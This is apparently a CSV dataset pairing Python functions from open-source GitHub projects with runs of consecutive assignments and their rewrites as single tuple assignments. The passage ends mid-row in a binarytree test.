pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/indexes/datetimes/test_constructors.py,TestDatetimeIndex,test_categorical_preserves_tz$97,"def test_categorical_preserves_tz(self):
        # GH#18664 retain tz when going DTI-->Categorical-->DTI
        dti = DatetimeIndex(
            [pd.NaT, ""2015-01-01"", ""1999-04-06 15:14:13"", ""2015-01-01""], tz=""US/Eastern""
        )

        for dtobj in [dti, dti._data]:
            # works for DatetimeIndex or DatetimeArray

            ci = pd.CategoricalIndex(dtobj)
            carr = pd.Categorical(dtobj)
            cser = pd.Series(ci)

            for obj in [ci, carr, cser]:
                result = DatetimeIndex(obj)
                tm.assert_index_equal(result, dti)","carr = pd.Categorical(dtobj)
cser = pd.Series(ci)","carr , cser  = pd.Categorical(dtobj), pd.Series(ci)"
oppia,https://github.com/oppia/oppia/tree/master/core/domain/story_services_test.py,StoryServicesUnitTests,test_cannot_update_story_with_exps_with_different_categories$1225,"def test_cannot_update_story_with_exps_with_different_categories(
        self
    ) -> None:
        topic_services.publish_story(
            self.TOPIC_ID, self.STORY_ID, self.user_id_admin)
        self.save_new_valid_exploration(
            'exp_id_1', self.user_id_a, title='title', category='Algebra',
            correctness_feedback_enabled=True)
        self.publish_exploration(self.user_id_a, 'exp_id_1')

        self.save_new_valid_exploration(
            'exp_id_2', self.user_id_a, title='title', category='Reading',
            correctness_feedback_enabled=True)
        self.publish_exploration(self.user_id_a, 'exp_id_2')

        change_list = [
            story_domain.StoryChange({
                'cmd': story_domain.CMD_ADD_STORY_NODE,
                'node_id': self.NODE_ID_2,
                'title': 'Title 2'
            }),
            story_domain.StoryChange({
                'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY,
                'property_name': (
                    story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID),
                'node_id': self.NODE_ID_1,
                'old_value': None,
                'new_value': 'exp_id_1'
            }),
            story_domain.StoryChange({
                'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY,
                'property_name': (
                    story_domain.STORY_NODE_PROPERTY_DESTINATION_NODE_IDS),
                'node_id': 'node_1',
                'old_value': self.OLD_VALUE,
                'new_value': ['node_2']
            }),
            story_domain.StoryChange({
                'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY,
                'property_name': (
                    story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID),
                'node_id': self.NODE_ID_2,
                'old_value': None,
                'new_value': 'exp_id_2'
            })
        ]

        validation_error_messages = (
            story_services.validate_explorations_for_story(
                ['exp_id_2', 'exp_id_1'], False))

        self.assertEqual(
            validation_error_messages, [
                'All explorations in a story should be of the same category. '
                'The explorations with ID exp_id_2 and exp_id_1 have different '
                'categories.'])
        with self.assertRaisesRegex(
            Exception, 'All explorations in a story should be of the '
            'same category'):
            story_services.update_story(
                self.USER_ID, self.STORY_ID, change_list, 'Updated story node.')","change_list = [story_domain.StoryChange({'cmd': story_domain.CMD_ADD_STORY_NODE, 'node_id': self.NODE_ID_2, 'title': 'Title 2'}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID, 'node_id': self.NODE_ID_1, 'old_value': None, 'new_value': 'exp_id_1'}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_DESTINATION_NODE_IDS, 'node_id': 'node_1', 'old_value': self.OLD_VALUE, 'new_value': ['node_2']}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID, 'node_id': self.NODE_ID_2, 'old_value': None, 'new_value': 'exp_id_2'})]
validation_error_messages = story_services.validate_explorations_for_story(['exp_id_2', 'exp_id_1'], False)","change_list , validation_error_messages  = [story_domain.StoryChange({'cmd': story_domain.CMD_ADD_STORY_NODE, 'node_id': self.NODE_ID_2, 'title': 'Title 2'}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID, 'node_id': self.NODE_ID_1, 'old_value': None, 'new_value': 'exp_id_1'}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_DESTINATION_NODE_IDS, 'node_id': 'node_1', 'old_value': self.OLD_VALUE, 'new_value': ['node_2']}), story_domain.StoryChange({'cmd': story_domain.CMD_UPDATE_STORY_NODE_PROPERTY, 'property_name': story_domain.STORY_NODE_PROPERTY_EXPLORATION_ID, 'node_id': self.NODE_ID_2, 'old_value': None, 'new_value': 'exp_id_2'})], story_services.validate_explorations_for_story(['exp_id_2', 'exp_id_1'], False)"
openTSNE,https://github.com/pavlin-policar/openTSNE/tree/master/tests/test_affinities.py,TestAffinityMatrixCorrectness,test_affinity_matrix_matches_precomputed_distance_affinity_matrix_random$289,"def test_affinity_matrix_matches_precomputed_distance_affinity_matrix_random(self):
        x = np.random.normal(0, 1, (200, 5))
        d = squareform(pdist(x))

        for method_name, cls in AFFINITY_CLASSES:
            aff1 = cls(d, metric=""precomputed"")
            aff2 = cls(x, metric=""euclidean"")

            np.testing.assert_almost_equal(
                aff1.P.toarray(), aff2.P.toarray(), err_msg=method_name
            )","aff1 = cls(d, metric='precomputed')
aff2 = cls(x, metric='euclidean')","aff1 , aff2  = cls(d, metric='precomputed'), cls(x, metric='euclidean')"
VMZ,https://github.com/facebookresearch/VMZ/tree/master/pt/vmz/common/log.py,MetricLogger,log_every$139,"def log_every(self, iterable, print_freq, header=None):
        i = 0
        if not header:
            header = """"
        start_time = time.time()
        end = time.time()

        space_fmt = "":"" + str(len(str(len(iterable)))) + ""d""
        if torch.cuda.is_available():
            log_msg = self.delimiter.join(
                [
                    header,
                    ""[{0"" + space_fmt + ""}/{1}]"",
                    ""eta: {eta}"",
                    ""{meters}"",
                    ""time: {time}"",
                    ""data: {data}"",
                    ""max mem: {memory:.0f}"",
                ]
            )
        else:
            log_msg = self.delimiter.join(
                [
                    header,
                    ""[{0"" + space_fmt + ""}/{1}]"",
                    ""eta: {eta}"",
                    ""{meters}"",
                    ""time: {time}"",
                    ""data: {data}"",
                ]
            )
        MB = 1024.0 * 1024.0
        for obj in iterable:
            self.meters[""data_time""].update(time.time() - end)
            yield obj
            self.meters[""iter_time""].update(time.time() - end)
            self._write_meters()
            if i % print_freq == 0:
                eta_seconds = self.meters[""iter_time""].global_avg * (len(iterable) - i)
                eta_string = str(datetime.timedelta(seconds=int(eta_seconds)))
                if torch.cuda.is_available():
                    print(
                        log_msg.format(
                            i,
                            len(iterable),
                            eta=eta_string,
                            meters=str(self),
                            time=str(self.meters[""iter_time""]),
                            data=str(self.meters[""data_time""]),
                            memory=torch.cuda.max_memory_allocated() / MB,
                        )
                    )
                else:
                    print(
                        log_msg.format(
                            i,
                            len(iterable),
                            eta=eta_string,
                            meters=str(self),
                            time=str(self.meters[""iter_time""]),
                            data=str(self.meters[""data_time""]),
                        )
                    )
            i += 1
            end = time.time()
        total_time = time.time() - start_time
        total_time_str = str(datetime.timedelta(seconds=int(total_time)))
        print(""{} Total time: {}"".format(header, total_time_str))
        self._write_epoch(total_time_str)","start_time = time.time()
end = time.time()
space_fmt = ':' + str(len(str(len(iterable)))) + 'd'","start_time , end , space_fmt  = time.time(), time.time(), ':' + str(len(str(len(iterable)))) + 'd'"
oauthlib,https://github.com/oauthlib/oauthlib/tree/master/tests/oauth2/rfc6749/clients/test_base.py,ClientTest,test_create_code_verifier_min_length$330,"def test_create_code_verifier_min_length(self):
        client = Client(self.client_id)
        length = 43
        code_verifier = client.create_code_verifier(length=length)
        self.assertEqual(client.code_verifier, code_verifier)","client = Client(self.client_id)
length = 43","client , length  = Client(self.client_id), 43"
PyHamcrest,https://github.com/hamcrest/PyHamcrest/tree/master/src/hamcrest/library/text/isequal_ignoring_whitespace.py,,stripspace$10,"def stripspace(string: str) -> str:
    result = """"
    last_was_space = True
    for character in string:
        if character.isspace():
            if not last_was_space:
                result += "" ""
            last_was_space = True
        else:
            result += character
            last_was_space = False
    return result.strip()","result = ''
last_was_space = True","result , last_was_space  = '', True"
securedrop,https://github.com/freedomofpress/securedrop/tree/master/journalist_gui/journalist_gui/SecureDropUpdater.py,SetupThread,__init__$48,"def __init__(self):
        QThread.__init__(self)
        self.output = """"
        self.update_success = False
        self.failure_reason = """"","self.output = ''
self.update_success = False
self.failure_reason = ''","self.output , self.update_success , self.failure_reason  = '', False, ''"
FastFCN,https://github.com/wuhuikai/FastFCN/tree/master/encoding/datasets/coco.py,COCOSegmentation,__init__$15,"def __init__(self, root=os.path.expanduser('~/.encoding/data'), split='train',
                 mode=None, transform=None, target_transform=None, **kwargs):
        super(COCOSegmentation, self).__init__(
            root, split, mode, transform, target_transform, **kwargs)
        from pycocotools.coco import COCO
        from pycocotools import mask
        if split == 'train':
            print('train set')
            ann_file = os.path.join(root, 'annotations/instances_train2017.json')
            ids_file = os.path.join(root, 'annotations/train_ids.pth')
            self.root = os.path.join(root, 'train2017')
        else:
            print('val set')
            ann_file = os.path.join(root, 'annotations/instances_val2017.json')
            ids_file = os.path.join(root, 'annotations/val_ids.pth')
            self.root = os.path.join(root, 'val2017')
        self.coco = COCO(ann_file)
        self.coco_mask = mask
        if os.path.exists(ids_file):
            self.ids = torch.load(ids_file)
        else:
            ids = list(self.coco.imgs.keys())
            self.ids = self._preprocess(ids, ids_file)
        self.transform = transform
        self.target_transform = target_transform","self.coco = COCO(ann_file)
self.coco_mask = mask","self.coco , self.coco_mask  = COCO(ann_file), mask"
FastFCN,https://github.com/wuhuikai/FastFCN/tree/master/encoding/datasets/coco.py,COCOSegmentation,__init__$15,"def __init__(self, root=os.path.expanduser('~/.encoding/data'), split='train',
                 mode=None, transform=None, target_transform=None, **kwargs):
        super(COCOSegmentation, self).__init__(
            root, split, mode, transform, target_transform, **kwargs)
        from pycocotools.coco import COCO
        from pycocotools import mask
        if split == 'train':
            print('train set')
            ann_file = os.path.join(root, 'annotations/instances_train2017.json')
            ids_file = os.path.join(root, 'annotations/train_ids.pth')
            self.root = os.path.join(root, 'train2017')
        else:
            print('val set')
            ann_file = os.path.join(root, 'annotations/instances_val2017.json')
            ids_file = os.path.join(root, 'annotations/val_ids.pth')
            self.root = os.path.join(root, 'val2017')
        self.coco = COCO(ann_file)
        self.coco_mask = mask
        if os.path.exists(ids_file):
            self.ids = torch.load(ids_file)
        else:
            ids = list(self.coco.imgs.keys())
            self.ids = self._preprocess(ids, ids_file)
        self.transform = transform
        self.target_transform = target_transform","self.transform = transform
self.target_transform = target_transform","self.transform , self.target_transform  = transform, target_transform"
FastFCN,https://github.com/wuhuikai/FastFCN/tree/master/encoding/datasets/coco.py,COCOSegmentation,__init__$15,"def __init__(self, root=os.path.expanduser('~/.encoding/data'), split='train',
                 mode=None, transform=None, target_transform=None, **kwargs):
        super(COCOSegmentation, self).__init__(
            root, split, mode, transform, target_transform, **kwargs)
        from pycocotools.coco import COCO
        from pycocotools import mask
        if split == 'train':
            print('train set')
            ann_file = os.path.join(root, 'annotations/instances_train2017.json')
            ids_file = os.path.join(root, 'annotations/train_ids.pth')
            self.root = os.path.join(root, 'train2017')
        else:
            print('val set')
            ann_file = os.path.join(root, 'annotations/instances_val2017.json')
            ids_file = os.path.join(root, 'annotations/val_ids.pth')
            self.root = os.path.join(root, 'val2017')
        self.coco = COCO(ann_file)
        self.coco_mask = mask
        if os.path.exists(ids_file):
            self.ids = torch.load(ids_file)
        else:
            ids = list(self.coco.imgs.keys())
            self.ids = self._preprocess(ids, ids_file)
        self.transform = transform
        self.target_transform = target_transform","ann_file = os.path.join(root, 'annotations/instances_train2017.json')
ids_file = os.path.join(root, 'annotations/train_ids.pth')
self.root = os.path.join(root, 'train2017')","ann_file , ids_file , self.root  = os.path.join(root, 'annotations/instances_train2017.json'), os.path.join(root, 'annotations/train_ids.pth'), os.path.join(root, 'train2017')"
PGPortfolio,https://github.com/ZhengyaoJiang/PGPortfolio/tree/master/pgportfolio/tdagent/tdagent.py,TDAgent,simplex_proj$72,"def simplex_proj(self, y):
        '''projection of y onto simplex. '''
        m = len(y)
        bget = False

        s = sorted(y, reverse = True)
        tmpsum = 0.

        for ii in range(m-1):
            tmpsum = tmpsum + s[ii]
            tmax = (tmpsum - 1) / (ii + 1)
            if tmax >= s[ii+1]:
                bget = True
                break

        if not bget:
            tmax = (tmpsum + s[m-1] - 1) / m

        return np.maximum(0, y-tmax)","m = len(y)
bget = False
s = sorted(y, reverse=True)
tmpsum = 0.0","m , bget , s , tmpsum  = len(y), False, sorted(y, reverse=True), 0.0"
DeepCTR-Torch,https://github.com/shenweichen/DeepCTR-Torch/tree/master/deepctr_torch/models/fibinet.py,FiBiNET,__init__$39,"def __init__(self, linear_feature_columns, dnn_feature_columns, bilinear_type='interaction',
                 reduction_ratio=3, dnn_hidden_units=(128, 128), l2_reg_linear=1e-5,
                 l2_reg_embedding=1e-5, l2_reg_dnn=0, init_std=0.0001, seed=1024, dnn_dropout=0, dnn_activation='relu',
                 task='binary', device='cpu', gpus=None):
        super(FiBiNET, self).__init__(linear_feature_columns, dnn_feature_columns, l2_reg_linear=l2_reg_linear,
                                      l2_reg_embedding=l2_reg_embedding, init_std=init_std, seed=seed, task=task,
                                      device=device, gpus=gpus)
        self.linear_feature_columns = linear_feature_columns
        self.dnn_feature_columns = dnn_feature_columns
        self.filed_size = len(self.embedding_dict)
        self.SE = SENETLayer(self.filed_size, reduction_ratio, seed, device)
        self.Bilinear = BilinearInteraction(self.filed_size, self.embedding_size, bilinear_type, seed, device)
        self.dnn = DNN(self.compute_input_dim(dnn_feature_columns), dnn_hidden_units,
                       activation=dnn_activation, l2_reg=l2_reg_dnn, dropout_rate=dnn_dropout, use_bn=False,
                       init_std=init_std, device=device)
        self.dnn_linear = nn.Linear(dnn_hidden_units[-1], 1, bias=False).to(device)","self.linear_feature_columns = linear_feature_columns
self.dnn_feature_columns = dnn_feature_columns","self.linear_feature_columns , self.dnn_feature_columns  = linear_feature_columns, dnn_feature_columns"
DeepCTR-Torch,https://github.com/shenweichen/DeepCTR-Torch/tree/master/deepctr_torch/models/fibinet.py,FiBiNET,__init__$39,"def __init__(self, linear_feature_columns, dnn_feature_columns, bilinear_type='interaction',
                 reduction_ratio=3, dnn_hidden_units=(128, 128), l2_reg_linear=1e-5,
                 l2_reg_embedding=1e-5, l2_reg_dnn=0, init_std=0.0001, seed=1024, dnn_dropout=0, dnn_activation='relu',
                 task='binary', device='cpu', gpus=None):
        super(FiBiNET, self).__init__(linear_feature_columns, dnn_feature_columns, l2_reg_linear=l2_reg_linear,
                                      l2_reg_embedding=l2_reg_embedding, init_std=init_std, seed=seed, task=task,
                                      device=device, gpus=gpus)
        self.linear_feature_columns = linear_feature_columns
        self.dnn_feature_columns = dnn_feature_columns
        self.filed_size = len(self.embedding_dict)
        self.SE = SENETLayer(self.filed_size, reduction_ratio, seed, device)
        self.Bilinear = BilinearInteraction(self.filed_size, self.embedding_size, bilinear_type, seed, device)
        self.dnn = DNN(self.compute_input_dim(dnn_feature_columns), dnn_hidden_units,
                       activation=dnn_activation, l2_reg=l2_reg_dnn, dropout_rate=dnn_dropout, use_bn=False,
                       init_std=init_std, device=device)
        self.dnn_linear = nn.Linear(dnn_hidden_units[-1], 1, bias=False).to(device)","self.dnn = DNN(self.compute_input_dim(dnn_feature_columns), dnn_hidden_units, activation=dnn_activation, l2_reg=l2_reg_dnn, dropout_rate=dnn_dropout, use_bn=False, init_std=init_std, device=device)
self.dnn_linear = nn.Linear(dnn_hidden_units[-1], 1, bias=False).to(device)","self.dnn , self.dnn_linear  = DNN(self.compute_input_dim(dnn_feature_columns), dnn_hidden_units, activation=dnn_activation, l2_reg=l2_reg_dnn, dropout_rate=dnn_dropout, use_bn=False, init_std=init_std, device=device), nn.Linear(dnn_hidden_units[-1], 1, bias=False).to(device)"
droidbot,https://github.com/honeynet/droidbot/tree/master/droidbot/input_policy2.py,AbsolutePositionalEncoding,forward$175,"def forward(self, pos_enc):
        l_emb = self.x_position_embeddings(pos_enc[:, 0])
        r_emb = self.x_position_embeddings(pos_enc[:, 1])
        t_emb = self.y_position_embeddings(pos_enc[:, 2])
        b_emb = self.y_position_embeddings(pos_enc[:, 3])
        w_emb = self.w_position_embeddings(pos_enc[:, 4])
        h_emb = self.h_position_embeddings(pos_enc[:, 5])
        pos_emb = l_emb + r_emb + t_emb + b_emb + w_emb + h_emb
        return pos_emb","l_emb = self.x_position_embeddings(pos_enc[:, 0])
r_emb = self.x_position_embeddings(pos_enc[:, 1])
t_emb = self.y_position_embeddings(pos_enc[:, 2])
b_emb = self.y_position_embeddings(pos_enc[:, 3])
w_emb = self.w_position_embeddings(pos_enc[:, 4])
h_emb = self.h_position_embeddings(pos_enc[:, 5])","l_emb , r_emb , t_emb , b_emb , w_emb , h_emb  = self.x_position_embeddings(pos_enc[:, 0]), self.x_position_embeddings(pos_enc[:, 1]), self.y_position_embeddings(pos_enc[:, 2]), self.y_position_embeddings(pos_enc[:, 3]), self.w_position_embeddings(pos_enc[:, 4]), self.h_position_embeddings(pos_enc[:, 5])"
funfuzz,https://github.com/MozillaSecurity/funfuzz/tree/master/src/funfuzz/js/with_binaryen.py,,wasmopt_run$87,"def wasmopt_run(seed):
    """"""Runs binaryen with the generated seed.

    Args:
        seed (Path): Generated jsfunfuzz file (acts as the seed for binaryen)

    Returns:
        bool: Returns True on successful wasm-opt execution, False otherwise
    """"""
    assert platform.system() == ""Linux""

    assert seed.is_file()
    seed_wrapper_output = seed.resolve().with_suffix("".wrapper"")
    seed_wasm_output = seed.resolve().with_suffix("".wasm"")

    sleep_time = 2
    t_lock = threading.Lock()
    with fasteners.try_lock(t_lock) as gotten:
        while True:
            if gotten:
                try:
                    # Wrapping this in str() seems necessary for Python 3.7.x and lower.
                    # See Python issue 31961
                    subprocess.run([str(ensure_binaryen(BINARYEN_URL, BINARYEN_VERSION)),
                                    str(seed),
                                    ""--translate-to-fuzz"",
                                    ""--disable-simd"",
                                    ""--output"", str(seed_wasm_output),
                                    f""--emit-js-wrapper={seed_wrapper_output}""], check=True)
                except (subprocess.CalledProcessError, OSError):
                    print(""wasm-opt aborted with a CalledProcessError or OSError. Trying again after 1 minute..."")
                    sleep(60)
                    # Wrapping this in str() seems necessary for Python 3.7.x and lower.
                    # See Python issue 31961
                    subprocess.run([str(ensure_binaryen(BINARYEN_URL, BINARYEN_VERSION)),
                                    str(seed),
                                    ""--translate-to-fuzz"",
                                    ""--disable-simd"",
                                    ""--output"", str(seed_wasm_output),
                                    f""--emit-js-wrapper={seed_wrapper_output}""], check=True)
                break
            sleep(sleep_time)
            sleep_time *= 2
    assert seed_wrapper_output.is_file()
    assert seed_wasm_output.is_file()

    return (seed_wrapper_output, seed_wasm_output)","seed_wrapper_output = seed.resolve().with_suffix('.wrapper')
seed_wasm_output = seed.resolve().with_suffix('.wasm')
sleep_time = 2
t_lock = threading.Lock()","seed_wrapper_output , seed_wasm_output , sleep_time , t_lock  = seed.resolve().with_suffix('.wrapper'), seed.resolve().with_suffix('.wasm'), 2, threading.Lock()"
AzurLaneAutoScript,https://github.com/LmeSzinc/AzurLaneAutoScript/tree/master/module/map/fleet.py,Fleet,track_movable$596,"def track_movable(self, enemy_cleared=True, siren=True):
        """"""
        Track enemy moving and predict missing enemies.

        Args:
            enemy_cleared (bool): True if cleared an enemy and need to scan spawn enemies.
                                  False if just a simple walk and only need to scan movable enemies.
            siren (bool): True if track sirens, false if track normal enemies
        """"""
        # Track siren moving
        before = self.movable_before if siren else self.movable_before_normal
        after = self.map.select(is_siren=True) if siren else self.map.select(is_enemy=True)
        step = self.config.MOVABLE_ENEMY_FLEET_STEP if siren else 1
        spawn = self.map.select(may_siren=True) if siren else self.map.select(may_enemy=True)
        matched_before, matched_after = match_movable(
            before=before.location,
            spawn=spawn.location,
            after=after.location,
            fleets=[self.fleet_current] if enemy_cleared else [],
            fleet_step=step
        )
        matched_before = self.map.to_selected(matched_before)
        matched_after = self.map.to_selected(matched_after)
        logger.info(f'Movable enemy {before} -> {after}')
        logger.info(f'Tracked enemy {matched_before} -> {matched_after}')

        # Delete wrong prediction
        for grid in after.delete(matched_after):
            if not grid.may_siren:
                logger.warning(f'Wrong detection: {grid}')
                grid.wipe_out()

        # Predict missing siren
        diff = before.delete(matched_before)
        _, missing = self.map.missing_get(
            self.battle_count, self.mystery_count, self.siren_count, self.carrier_count, mode='normal')
        missing = missing['siren'] if siren else missing['enemy']
        if diff and missing != 0:
            logger.warning(f'Movable enemy tracking lost: {diff}')
            covered = self.map.grid_covered(self.map[self.fleet_current], location=[(0, -2)])
            if self.fleet_1_location:
                covered = covered.add(self.map.grid_covered(self.map[self.fleet_1_location], location=[(0, -1)]))
            if self.fleet_2_location:
                covered = covered.add(self.map.grid_covered(self.map[self.fleet_2_location], location=[(0, -1)]))
            if siren:
                for grid in after:
                    covered = covered.add(self.map.grid_covered(grid))
            else:
                for grid in self.map.select(is_siren=True):
                    covered = covered.add(self.map.grid_covered(grid))
            logger.attr('enemy_covered', covered)
            accessible = SelectedGrids([])
            for grid in diff:
                self.map.find_path_initial(grid, has_ambush=False)
                accessible = accessible.add(self.map.select(cost=0)).add(self.map.select(cost=1))
                if siren:
                    accessible = accessible.add(self.map.select(cost=2))
            self.map.find_path_initial(self.fleet_current, has_ambush=self.config.MAP_HAS_AMBUSH)
            logger.attr('enemy_accessible', accessible)
            predict = accessible.intersect(covered).select(is_sea=True, is_fleet=False)
            logger.info(f'Movable enemy predict: {predict}')
            matched_after = matched_after.add(predict)
            for grid in predict:
                if siren:
                    grid.is_siren = True
                grid.is_enemy = True
        elif missing == 0:
            logger.info(f'Movable enemy tracking drop: {diff}')

        for grid in matched_after:
            if grid.location != self.fleet_current:
                grid.is_movable = True","before = self.movable_before if siren else self.movable_before_normal
after = self.map.select(is_siren=True) if siren else self.map.select(is_enemy=True)
step = self.config.MOVABLE_ENEMY_FLEET_STEP if siren else 1
spawn = self.map.select(may_siren=True) if siren else self.map.select(may_enemy=True)","before , after , step , spawn  = self.movable_before if siren else self.movable_before_normal, self.map.select(is_siren=True) if siren else self.map.select(is_enemy=True), self.config.MOVABLE_ENEMY_FLEET_STEP if siren else 1, self.map.select(may_siren=True) if siren else self.map.select(may_enemy=True)"
AzurLaneAutoScript,https://github.com/LmeSzinc/AzurLaneAutoScript/tree/master/module/map/fleet.py,Fleet,track_movable$596,"def track_movable(self, enemy_cleared=True, siren=True):
        """"""
        Track enemy moving and predict missing enemies.

        Args:
            enemy_cleared (bool): True if cleared an enemy and need to scan spawn enemies.
                                  False if just a simple walk and only need to scan movable enemies.
            siren (bool): True if track sirens, false if track normal enemies
        """"""
        # Track siren moving
        before = self.movable_before if siren else self.movable_before_normal
        after = self.map.select(is_siren=True) if siren else self.map.select(is_enemy=True)
        step = self.config.MOVABLE_ENEMY_FLEET_STEP if siren else 1
        spawn = self.map.select(may_siren=True) if siren else self.map.select(may_enemy=True)
        matched_before, matched_after = match_movable(
            before=before.location,
            spawn=spawn.location,
            after=after.location,
            fleets=[self.fleet_current] if enemy_cleared else [],
            fleet_step=step
        )
        matched_before = self.map.to_selected(matched_before)
        matched_after = self.map.to_selected(matched_after)
        logger.info(f'Movable enemy {before} -> {after}')
        logger.info(f'Tracked enemy {matched_before} -> {matched_after}')

        # Delete wrong prediction
        for grid in after.delete(matched_after):
            if not grid.may_siren:
                logger.warning(f'Wrong detection: {grid}')
                grid.wipe_out()

        # Predict missing siren
        diff = before.delete(matched_before)
        _, missing = self.map.missing_get(
            self.battle_count, self.mystery_count, self.siren_count, self.carrier_count, mode='normal')
        missing = missing['siren'] if siren else missing['enemy']
        if diff and missing != 0:
            logger.warning(f'Movable enemy tracking lost: {diff}')
            covered = self.map.grid_covered(self.map[self.fleet_current], location=[(0, -2)])
            if self.fleet_1_location:
                covered = covered.add(self.map.grid_covered(self.map[self.fleet_1_location], location=[(0, -1)]))
            if self.fleet_2_location:
                covered = covered.add(self.map.grid_covered(self.map[self.fleet_2_location], location=[(0, -1)]))
            if siren:
                for grid in after:
                    covered = covered.add(self.map.grid_covered(grid))
            else:
                for grid in self.map.select(is_siren=True):
                    covered = covered.add(self.map.grid_covered(grid))
            logger.attr('enemy_covered', covered)
            accessible = SelectedGrids([])
            for grid in diff:
                self.map.find_path_initial(grid, has_ambush=False)
                accessible = accessible.add(self.map.select(cost=0)).add(self.map.select(cost=1))
                if siren:
                    accessible = accessible.add(self.map.select(cost=2))
            self.map.find_path_initial(self.fleet_current, has_ambush=self.config.MAP_HAS_AMBUSH)
            logger.attr('enemy_accessible', accessible)
            predict = accessible.intersect(covered).select(is_sea=True, is_fleet=False)
            logger.info(f'Movable enemy predict: {predict}')
            matched_after = matched_after.add(predict)
            for grid in predict:
                if siren:
                    grid.is_siren = True
                grid.is_enemy = True
        elif missing == 0:
            logger.info(f'Movable enemy tracking drop: {diff}')

        for grid in matched_after:
            if grid.location != self.fleet_current:
                grid.is_movable = True","matched_before = self.map.to_selected(matched_before)
matched_after = self.map.to_selected(matched_after)","matched_before , matched_after  = self.map.to_selected(matched_before), self.map.to_selected(matched_after)"
coach,https://github.com/IntelLabs/coach/tree/master/rl_coach/dashboard_components/experiment_board.py,,unload_file$296,"def unload_file():
    global selected_file
    if selected_file is None:
        return
    selected_file.hide_all_signals()
    del signals_files[selected_file.filename]
    data_selector.options = [""""]
    filenames_list = copy.copy(files_selector.options)
    filenames_list.remove(selected_file.filename)
    if len(filenames_list) == 0:
        filenames_list = [""""]
    files_selector.options = filenames_list
    filenames = cycle(filenames_list)
    if files_selector.options[0] != """":
        files_selector.value = next(filenames)
    else:
        files_selector.value = None

    update_legend()
    refresh_info.text = """"
    if len(signals_files) == 0:
        selected_file = None","data_selector.options = ['']
filenames_list = copy.copy(files_selector.options)","data_selector.options , filenames_list  = [''], copy.copy(files_selector.options)"
coach,https://github.com/IntelLabs/coach/tree/master/rl_coach/dashboard_components/experiment_board.py,,unload_file$296,"def unload_file():
    global selected_file
    if selected_file is None:
        return
    selected_file.hide_all_signals()
    del signals_files[selected_file.filename]
    data_selector.options = [""""]
    filenames_list = copy.copy(files_selector.options)
    filenames_list.remove(selected_file.filename)
    if len(filenames_list) == 0:
        filenames_list = [""""]
    files_selector.options = filenames_list
    filenames = cycle(filenames_list)
    if files_selector.options[0] != """":
        files_selector.value = next(filenames)
    else:
        files_selector.value = None

    update_legend()
    refresh_info.text = """"
    if len(signals_files) == 0:
        selected_file = None","files_selector.options = filenames_list
filenames = cycle(filenames_list)","files_selector.options , filenames  = filenames_list, cycle(filenames_list)"
streamlink,https://github.com/streamlink/streamlink/tree/master/src/streamlink/stream/wrappers.py,Filler,__init__$53,"def __init__(self, fd, buffer):
            Thread.__init__(self)

            self.error = None
            self.fd = fd
            self.buffer = buffer
            self.daemon = True
            self.running = False","self.error = None
self.fd = fd
self.buffer = buffer
self.daemon = True
self.running = False","self.error , self.fd , self.buffer , self.daemon , self.running  = None, fd, buffer, True, False"
TradingGym,https://github.com/Yvictor/TradingGym/tree/master/trading_env/envs/backtest_v1.py,trading_env,render$342,"def render(self, save=False):
        if self.render_on == 0:
            matplotlib.style.use('dark_background')
            self.render_on = 1

            left, width = 0.1, 0.8
            rect1 = [left, 0.4, width, 0.55]
            rect2 = [left, 0.2, width, 0.2]
            rect3 = [left, 0.05, width, 0.15]

            self.fig = plt.figure(figsize=(15,8))
            self.fig.suptitle('%s'%self.df_sample['datetime'].iloc[0].date(), fontsize=14, fontweight='bold')
            #self.ax = self.fig.add_subplot(1,1,1)
            self.ax = self.fig.add_axes(rect1)  # left, bottom, width, height
            self.ax2 = self.fig.add_axes(rect2, sharex=self.ax)
            self.ax3 = self.fig.add_axes(rect3, sharex=self.ax)
            self.ax.grid(color='gray', linestyle='-', linewidth=0.5)
            self.ax2.grid(color='gray', linestyle='-', linewidth=0.5)
            self.ax3.grid(color='gray', linestyle='-', linewidth=0.5)
            self.features_color = [c.rgb+(0.9,) for c in Color('yellow').range_to(Color('cyan'), self.feature_len)]
            #fig, ax = plt.subplots()
            self._plot_trading()

            self.ax.set_xlim(0,len(self.price[:self.step_st+self.obs_len])+200)
            plt.ion()
            #self.fig.tight_layout()
            plt.show()
            if save:
                self.fig.savefig('fig/%s.png' % str(self.t_index))

        elif self.render_on == 1:
            self.ax.lines.remove(self.price_plot[0])
            [self.ax3.lines.remove(plot) for plot in self.features_plot]
            self.fluc_reward_plot_p.remove()
            self.fluc_reward_plot_n.remove()
            self.target_box.remove()
            self.reward_plot_p.remove()
            self.reward_plot_n.remove()
            self.posi_plot_long.remove()
            self.posi_plot_short.remove()
            self.trade_plot_buy.remove()
            self.trade_plot_sell.remove()

            self._plot_trading()

            self.ax.set_xlim(0,len(self.price[:self.step_st+self.obs_len])+200)
            if save:
                self.fig.savefig('fig/%s.png' % str(self.t_index))
            plt.pause(0.0001)","rect1 = [left, 0.4, width, 0.55]
rect2 = [left, 0.2, width, 0.2]
rect3 = [left, 0.05, width, 0.15]
self.fig = plt.figure(figsize=(15, 8))","rect1 , rect2 , rect3 , self.fig  = [left, 0.4, width, 0.55], [left, 0.2, width, 0.2], [left, 0.05, width, 0.15], plt.figure(figsize=(15, 8))"
binarytree,https://github.com/joowani/binarytree/tree/master/tests/test_tree.py,,test_get_index_utility_function$1463,"def test_get_index_utility_function() -> None:
    root = Node(0)
    root.left = Node(1)
    root.right = Node(2)
    root.left.left = Node(3)
    root.right.right = Node(4)

    assert get_index(root, root) == 0
